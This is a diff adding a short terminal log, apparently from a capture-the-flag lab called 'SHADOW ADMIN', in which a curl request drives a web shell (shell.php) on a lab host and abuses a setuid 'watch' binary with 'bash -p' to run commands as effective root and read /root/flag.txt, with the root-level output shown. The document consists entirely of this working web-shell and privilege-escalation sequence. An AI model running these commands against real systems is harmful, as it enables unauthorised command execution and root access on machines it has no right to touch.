@@ -1,0 +1,9 @@
+chifay@kali:~/SHADOW ADMIN$ curl -sS --get --data-urlencode "c=TERM=xterm timeout 2 /usr/bin/watch -t -n 1 -x /bin/bash -p -c 'id > /tmp/wid5 2>&1; cat /root/flag.txt >> /tmp/wid5 2>&1'; cat /tmp/wid5" http://172.17.0.2/shell.php
+
+<pre>
+uid=1000(admin) gid=1000(admin) euid=0(root) groups=1000(admin),27(sudo)
+SHADOW{...}
+</pre>
+chifay@kali:~/SHADOW ADMIN$ exit
+
+exit
